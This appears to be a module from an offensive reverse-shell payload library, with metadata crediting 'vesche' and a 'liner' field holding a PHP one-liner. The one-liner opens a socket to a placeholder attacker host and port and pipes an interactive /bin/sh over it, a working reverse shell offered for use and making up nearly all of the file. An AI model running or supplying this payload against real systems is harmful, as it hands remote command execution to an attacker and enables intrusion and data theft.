class info:
    author      = "vesche"
    description = "Uses PHP sockets & exec to create a reverse shell."
    function    = "reverse shell"
    liner       = """php -r '$sock=fsockopen("TARGET",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'"""
